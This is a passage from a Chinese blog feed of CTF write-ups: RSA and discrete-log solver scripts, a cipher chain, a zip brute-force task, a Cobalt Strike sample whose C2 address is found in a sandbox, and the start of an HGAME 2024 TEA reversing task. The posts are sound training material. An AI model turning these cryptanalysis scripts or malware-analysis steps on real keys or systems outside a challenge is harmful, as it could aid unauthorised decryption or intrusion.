class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">from</span> <span class="string">prism</span> <span class="string">import</span> <span class="string">*</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">import</span> <span class="string">heapq</span></span><br><span class="line"></span><br><span class="line"><span class="string">def</span> <span class="string">dijkstra(graph,</span> <span class="string">start,</span> <span class="string">end):</span></span><br><span class="line">    <span class="string">heap</span> <span class="string">=</span> [<span class="string">(0</span>, <span class="string">start)</span>]</span><br><span class="line">    <span class="string">distances</span> <span class="string">=</span> &#123;<span class="attr">node:</span> <span class="string">float(&#x27;infinity&#x27;)</span> <span class="string">for</span> <span class="string">node</span> <span class="string">in</span> <span class="string">graph</span>&#125;</span><br><span class="line">    <span class="string">distances[start]</span> <span class="string">=</span> <span class="number">0</span></span><br><span class="line">    <span class="string">paths</span> <span class="string">=</span> &#123;<span class="attr">start:</span> []&#125;</span><br><span class="line"></span><br><span class="line">    <span class="attr">while heap:</span></span><br><span class="line">        <span class="string">(dist,</span> <span class="string">current)</span> <span class="string">=</span> <span class="string">heapq.heappop(heap)</span></span><br><span class="line">        <span class="string">if</span> <span class="string">dist</span> <span class="string">&gt;</span> <span class="string">distances[current]:</span></span><br><span class="line">            <span class="string">continue</span></span><br><span class="line">        <span class="string">for</span> <span class="string">neighbor,</span> <span class="string">neighbor_dist</span> <span class="string">in</span> <span class="string">graph[current].items():</span></span><br><span class="line">            <span class="string">old_dist</span> <span class="string">=</span> <span class="string">distances[neighbor]</span></span><br><span class="line">            <span class="string">new_dist</span> <span class="string">=</span> <span class="string">dist</span> <span class="string">+</span> <span class="string">neighbor_dist</span></span><br><span class="line">            <span class="string">if</span> <span class="string">new_dist</span> <span class="string">&lt;</span> <span class="attr">old_dist:</span></span><br><span class="line">                <span class="string">distances[neighbor]</span> <span class="string">=</span> <span class="string">new_dist</span></span><br><span class="line">                <span class="string">paths[neighbor]</span> <span class="string">=</span> <span class="string">paths[current]</span> <span class="string">+</span> [<span class="string">neighbor</span>]</span><br><span class="line">                <span class="string">heapq.heappush(heap,</span> <span class="string">(new_dist,</span> <span class="string">neighbor))</span></span><br><span class="line">    <span class="string">return</span> <span class="string">distances[end],</span> <span class="string">paths[end]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义图的边和权重</span></span><br><span class="line"><span class="string">graph</span> <span class="string">=</span> &#123;</span><br><span class="line">    <span class="attr">1:</span> &#123;<span class="attr">2:</span> <span class="number">2</span>, <span class="attr">3:</span> <span class="number">3</span>&#125;,</span><br><span class="line">    <span class="attr">2:</span> &#123;<span class="attr">3:</span> <span class="number">5</span>, <span class="attr">4:</span> <span class="number">3</span>, <span class="attr">10:</span> <span class="number">20</span>&#125;,</span><br><span class="line">    <span class="attr">3:</span> &#123;<span class="attr">5:</span> <span class="number">6</span>, <span class="attr">8:</span> <span class="number">5</span>&#125;,</span><br><span class="line">    <span class="attr">4:</span> &#123;<span class="attr">5:</span> <span class="number">7</span>&#125;,</span><br><span class="line">    <span class="attr">5:</span> &#123;<span class="attr">9:</span> <span class="number">4</span>, <span class="attr">8:</span> <span class="number">1</span>&#125;,</span><br><span class="line">    <span class="attr">6:</span> &#123;<span class="attr">7:</span> <span class="number">3</span>&#125;,</span><br><span class="line">    <span class="attr">7:</span> &#123;<span class="attr">14:</span> <span class="number">6</span>&#125;,</span><br><span class="line">    <span class="attr">8:</span> &#123;<span class="attr">11:</span> <span class="number">5</span>, <span class="attr">15:</span> <span class="number">21</span>&#125;,</span><br><span class="line">    <span class="attr">9:</span> &#123;<span class="attr">12:</span> <span class="number">5</span>&#125;,</span><br><span class="line">    <span class="attr">10:</span> &#123;&#125;,</span><br><span class="line">    <span class="attr">11:</span> &#123;<span class="attr">15:</span> <span class="number">13</span>&#125;,</span><br><span class="line">    <span class="attr">12:</span> &#123;<span class="attr">15:</span> <span class="number">9</span>&#125;,</span><br><span class="line">    <span class="attr">14:</span> &#123;<span class="attr">15:</span> <span class="number">7</span>&#125;,</span><br><span class="line">    <span class="attr">15:</span> &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行Dijkstra算法</span></span><br><span class="line"><span class="string">distance,</span> <span class="string">path</span> <span class="string">=</span> <span class="string">dijkstra(graph,</span> <span class="number">1</span><span class="string">,</span> <span class="number">15</span><span class="string">)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出结果</span></span><br><span class="line"><span class="string">print(f&quot;最短距离:</span> &#123;<span class="string">distance</span>&#125;<span class="string">&quot;)</span></span><br><span class="line"><span class="string">print(f&quot;</span><span class="string">路径:</span> &#123;<span class="string">&#x27; -&gt; &#x27;</span><span class="string">.join(map(str</span>, <span class="string">path))</span>&#125;<span class="string">&quot;)</span></span><br><span class="line"><span class="string">pmd5(&quot;</span><span class="number">1381115</span><span class="string">&quot;)</span></span><br></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">flag</span>&#123;<span class="number">4991</span>ce1781b53409a7a84e2baf9431d6&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 题集 </category>
          
          <category> CTF </category>
          
          <category> 杂题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 逆向 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>青少年ctf#1 wp</title>
      <link href="/posts/c4803d60.html"/>
      <url>/posts/c4803d60.html</url>
      
        <content type="html"><![CDATA[<p>不知为何，密码比逆向做的多，但是不会密码也不会逆向</p><h2 id="crypto">crypto</h2><h3 id="解个方程">解个方程</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert</span><br><span class="line">p = <span class="number">88405749077010121197972538332505989817</span></span><br><span class="line">q = <span class="number">314336612126421969080144444342415739457</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">d = invert(e, (p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line"><span class="built_in">print</span>(d)</span><br></pre></td></tr></table></figure><p>这个是动态flag</p><h3 id="ez-log">ez_log</h3><p>这个题是求离散对数，g=3，直接用函数求</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> sympy.ntheory <span class="keyword">import</span> discrete_log</span><br><span class="line">p=<span class="number">3006156660704242356836102321001016782090189571028526298055526061772989406357037170723984497344618257575827271367883545096587962708266010793826346841303043716776726799898939374985320242033037</span></span><br><span class="line">g = <span class="number">3</span></span><br><span class="line">c=<span class="number">2637361207438328172880452774725735558448205624296999428196250415451022718950315626464793126507500112508727744681450551541566511482157902377105193512791814667446983536196889757495426692091900</span></span><br><span class="line"></span><br><span class="line">m = discrete_log(p, c, g)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure><p>也是动态flag</p><h3 id="四重加密">四重加密</h3><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">base32:</span></span><br><span class="line"><span class="language-xml">qsnctf</span></span><br><span class="line"><span class="language-xml">ascii code:</span></span><br><span class="line"><span class="language-xml">zcye</span><span class="template-variable">&#123;mxmemtxrzt_lzbha_kwmqzec&#125;</span><span class="language-xml">|key=hello</span></span><br><span class="line"><span class="language-xml">维吉尼亚：</span></span><br><span class="line"><span class="language-xml">synt</span><span class="template-variable">&#123;yqitbfqnoi_xsxwp_wpifoqv&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">凯撒:</span></span><br><span class="line"><span class="language-xml">flag</span><span class="template-variable">&#123;ldvgosdabv_kfkjc_jcvsbdi&#125;</span></span><br></pre></td></tr></table></figure><p>把flag改成qsnctf就好</p><h3 id="ez-rsa">ez_rsa</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">flag = <span class="string">b&#x27;qsnctf&#123;xxx-xxxx-xxxx-xxxx-xxxxxxxxx&#125;&#x27;</span></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">r = getPrime(<span class="number">512</span>)</span><br><span class="line">n = p * q * r</span><br><span class="line">leak = p * q</span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c = <span class="subst">&#123;c&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;n = <span class="subst">&#123;n&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;leak = <span class="subst">&#123;leak&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure><p>相当于已知r,e,c求m</p><p>我们知道<br>$$<br>c = m^e \mod pqr\iff\<br>c = m^e + kpqr\iff\<br>c = m^e + (kpq)r\iff\<br>c = m^e \mod r<br>$$<br>那么就可以解出来了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2 <span class="keyword">as</span> gy</span><br><span class="line"></span><br><span class="line">c = <span class="number">173595148273920891298949441727054328036798235134009407863895058729356993814829340513336567479145746034781201823694596731886346933549577879568197521436900228804336056005940048086898794965549472641334237175801757569154295743915744875800647234151498117718087319013271748204766997008772782882813572814296213516343420236873651060868227487925491016675461540894535563805130406391144077296854410932791530755245514034242725719196949258860635915202993968073392778882692892</span></span><br><span class="line">n = <span class="number">1396260492498511956349135417172451037537784979103780135274615061278987700332528182553755818089525730969834188061440258058608031560916760566772742776224528590152873339613356858551518007022519033843622680128062108378429621960808412913676262141139805667510615660359775475558729686515755127570976326233255349428771437052206564497930971797497510539724340471032433502724390526210100979700467607197448780324427953582222885828678441579349835574787605145514115368144031247</span></span><br><span class="line">leak = <span class="number">152254254502019783796170793516692965417859793325424454902983763285830332059600151137162944897787532369961875766745853731769162511788354655291037150251085942093411304833287510644995339391240164033052417935316876168953838783742499485868268986832640692657031861629721225482114382472324320636566226653243762620647</span></span><br><span class="line">r = n // leak</span><br><span class="line">phi = r-<span class="number">1</span></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">d = gy.invert(e,phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,r)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"><span class="comment">#qsnctf&#123;12ff81e0-7646-4a96-a7eb-6a509ec01c9e&#125;</span></span><br></pre></td></tr></table></figure><p>根据这道题可以知道：已知c,e,和n的任意一个因子（如果这个因子可以求phi）那就可以直接解</p><h3 id="factor1">factor1</h3><p>这个题是第一次见</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">d = getPrime(<span class="number">256</span>)</span><br><span class="line">e = gmpy2.invert(d, (p**<span class="number">2</span> - <span class="number">1</span>) * (q**<span class="number">2</span> - <span class="number">1</span>))</span><br><span class="line">flag = <span class="string">&quot;qsnctf&#123;&quot;</span> + hashlib.md5(<span class="built_in">str</span>(p+q).encode()).hexdigest() + <span class="string">&quot;&#125;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># 4602579741478096718172697218991734057017874575484294836043557658035277770732473025335441717904100009903832353915404911860888652406859201203199117870443451616457858224082143505393843596092945634675849883286107358454466242110831071552006337406116884147391687266536283395576632885877802269157970812862013700574069981471342712011889330292259696760297157958521276388120468220050600419562910879539594831789625596079773163447643235584124521162320450208920533174722239029506505492660271016917768383199286913178821124229554263149007237679675898370759082438533535303763664408320263258144488534391712835778283152436277295861859</span></span><br><span class="line"><span class="comment"># 78665180675705390001452176028555030916759695827388719494705803822699938653475348982551790040292552032924503104351703419136483078949363470430486531014134503794074329285351511023863461560882297331218446027873891885693166833003633460113924956936552466354566559741886902240131031116897293107970411780310764816053</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以看到这个题很神奇的地方在于(p**2 - 1) * (q**2 - 1),所以我去搜了一下，就搜到攻击脚本了</p><p><a href="https://www.cnblogs.com/tr0uble/p/17106202.html#/c/subject/p/17106202.html">Cryptanalysis of RSA Variants with Primes Sharing Most Significant Bits - tr0uble - 博客园 (cnblogs.com)</a></p><p>好像叫LUC，用连分数方法攻击，但是看不懂，有机会之后看看</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> isqrt</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">attack</span>(<span class="params">N, e</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Recovers the prime factors of a modulus and the private exponent if two prime factors share most significant bits</span></span><br><span class="line"><span class="string">    :param N: the modulus</span></span><br><span class="line"><span class="string">    :param e: the public exponent</span></span><br><span class="line"><span class="string">    :return: a tuple containing the prime factors and the private exponent, or None if the private exponent was not found</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    PR = PolynomialRing(ZZ, <span class="string">&#x27;x&#x27;</span>)</span><br><span class="line">    x = PR.gen()</span><br><span class="line">    convergents = continued_fraction(ZZ(e) / ZZ((N-<span class="number">1</span>)**<span class="number">2</span>)).convergents()</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> convergents:</span><br><span class="line">        k = c.numerator()</span><br><span class="line">        d = c.denominator()</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            f = x**<span class="number">2</span> - x*(N**<span class="number">2</span> + <span class="number">1</span> - <span class="built_in">int</span>((e*d-<span class="number">1</span>)/k)) + N**<span class="number">2</span></span><br><span class="line">            <span class="keyword">if</span> f.discriminant() &gt; <span class="number">0</span>:</span><br><span class="line">                root = f.roots()</span><br><span class="line">                p2 = root[<span class="number">0</span>][<span class="number">0</span>]; q2 = root[<span class="number">1</span>][<span class="number">0</span>]</span><br><span class="line">                <span class="keyword">if</span> is_square(p2) <span class="keyword">and</span> is_square(q2):</span><br><span class="line">                    p = isqrt(p2); q = isqrt(q2)</span><br><span class="line">                    <span class="keyword">if</span> p*q == N:</span><br><span class="line">                        <span class="keyword">return</span> p, q, d</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">e = <span class="number">4602579741478096718172697218991734057017874575484294836043557658035277770732473025335441717904100009903832353915404911860888652406859201203199117870443451616457858224082143505393843596092945634675849883286107358454466242110831071552006337406116884147391687266536283395576632885877802269157970812862013700574069981471342712011889330292259696760297157958521276388120468220050600419562910879539594831789625596079773163447643235584124521162320450208920533174722239029506505492660271016917768383199286913178821124229554263149007237679675898370759082438533535303763664408320263258144488534391712835778283152436277295861859</span></span><br><span class="line">n = <span class="number">78665180675705390001452176028555030916759695827388719494705803822699938653475348982551790040292552032924503104351703419136483078949363470430486531014134503794074329285351511023863461560882297331218446027873891885693166833003633460113924956936552466354566559741886902240131031116897293107970411780310764816053</span></span><br><span class="line">p=q=d=<span class="number">0</span></span><br><span class="line">p,q,d = attack(n,e)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>(p + q))</span><br></pre></td></tr></table></figure><p>这个是sage</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">17842948407837550252915901438494310860377505026658598797918460167146832545038336985103505761787935094014130901091944301325113646047622033244783641463109866</span>\</span><br><span class="line"><span class="attribute">qsnctf</span>&#123;<span class="number">8072</span>e8b2982bc729cc74ef58f1abc862&#125;</span><br></pre></td></tr></table></figure><h2 id="misc">misc</h2><p>那个txt一打开，好像看不出来是什么，到最后发现504d0304那就是压缩包了，写个脚本生成文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">hex_to_bin</span>(<span class="params">input_file, output_file</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(input_file, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f_in, <span class="built_in">open</span>(output_file, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f_out:</span><br><span class="line">        <span class="keyword">for</span> i, line <span class="keyword">in</span> <span class="built_in">enumerate</span>(f_in):</span><br><span class="line">            <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">0</span>:  <span class="comment"># 每隔一行处理一次</span></span><br><span class="line">                hex_str = line[<span class="number">10</span>:<span class="number">57</span>].replace(<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;&#x27;</span>)  <span class="comment"># 从第11个字符开始，读取到第57个字符</span></span><br><span class="line">                bin_data = <span class="built_in">bytes</span>.fromhex(hex_str)</span><br><span class="line">                f_out.write(bin_data)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用函数</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">hex_to_bin(<span class="string">&#x27;a.txt&#x27;</span>, <span class="string">&#x27;output.zip&#x27;</span>)</span><br><span class="line"><span class="comment">#这边事先处理成正的了</span></span><br></pre></td></tr></table></figure><p>output.zip直接爆破，因为说了是小写和数字</p><p>z12345，得到flag图片拼接即可</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">qsnctf</span><span class="template-variable">&#123;b414e3e3a6449ddba0997db259203eb7&#125;</span></span><br></pre></td></tr></table></figure><h2 id="RE">RE</h2><h3 id="来打cs咯">来打cs咯</h3><p>文件描述不要在实体机打开</p><p>于是在win10虚拟机中sandboxie中尝试用ida调试</p><p>但是打开后函数很杂，看不出来在干什么</p><p>网上查查这种题该怎么做，看到要放到在线沙箱中分析一下</p><p>直接拿到</p><p>10.0.80.253:8118</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">qsnctf</span>&#123;<span class="number">10.0.80.253:8118</span>&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 题集 </category>
          
          <category> CTF </category>
          
          <category> 比赛 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> re </tag>
            
            <tag> crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HGAME 2024 week4 RE wp</title>
      <link href="/posts/f5113ec1.html"/>
      <url>/posts/f5113ec1.html</url>
      
        <content type="html"><![CDATA[<p>这次re至少能看懂</p><h2 id="RE">RE</h2><h3 id="again">again!</h3><p>打开后发现一个py打包的exe和bin2.pyc</p><p>反编译一下第一个文件,说是要用这个文件去解密bin2,但是看不懂QAQ</p><p>但是二进制形式打开bin2，观察可以发现出现大量一样的</p><p>a405b5d321e446459d8f9169d027bd92</p><p>怀疑是异或，所以</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor_with_key</span>(<span class="params">input_file, key, output_file</span>):</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(input_file, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> fin, <span class="built_in">open</span>(output_file, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> fout:</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            chunk = fin.read(<span class="number">32</span>)  </span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(chunk) == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            data = <span class="built_in">bytearray</span>(<span class="built_in">len</span>(chunk))</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(chunk)):</span><br><span class="line">                data[i] = chunk[i] ^ <span class="built_in">ord</span>(key[i % <span class="built_in">len</span>(key)])  </span><br><span class="line">            fout.write(data)  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">key = <span class="string">&quot;a405b5d321e446459d8f9169d027bd92&quot;</span>  </span><br><span class="line">xor_with_key(<span class="string">&#x27;bin2&#x27;</span>, key, <span class="string">&#x27;output.bin&#x27;</span>)</span><br></pre></td></tr></table></figure><p>然后得到的文件再二进制打开一下，是winPE，就ida打开</p><p>主函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> key[<span class="number">6</span>]; <span class="comment">// [rsp+20h] [rbp-18h] BYREF</span></span><br><span class="line"></span><br><span class="line">  sub_140001020(<span class="string">&quot;plz input your flag:&quot;</span>);</span><br><span class="line">  sub_140001080(<span class="string">&quot;%32s&quot;</span>,flag);</span><br><span class="line">  key[<span class="number">0</span>] = <span class="number">0x1234</span>;</span><br><span class="line">  key[<span class="number">1</span>] = <span class="number">0x2341</span>;</span><br><span class="line">  key[<span class="number">2</span>] = <span class="number">0x3412</span>;</span><br><span class="line">  key[<span class="number">3</span>] = <span class="number">0x4123</span>;</span><br><span class="line">  encode(key);</span><br><span class="line">  i = <span class="number">0</span>i64;</span><br><span class="line">  <span class="keyword">while</span> ( flag[i] == *(_DWORD *)((<span class="type">char</span> *)&amp;check + i * <span class="number">4</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( ++v3 &gt;= <span class="number">8</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_140001020(<span class="string">&quot;Congratulations!&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  sub_140001020(<span class="string">&quot;Wrong!try again...&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看起来就是flag以dword来加密然后比较,encode里面是一个TEA变体，直接逆就好了</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span 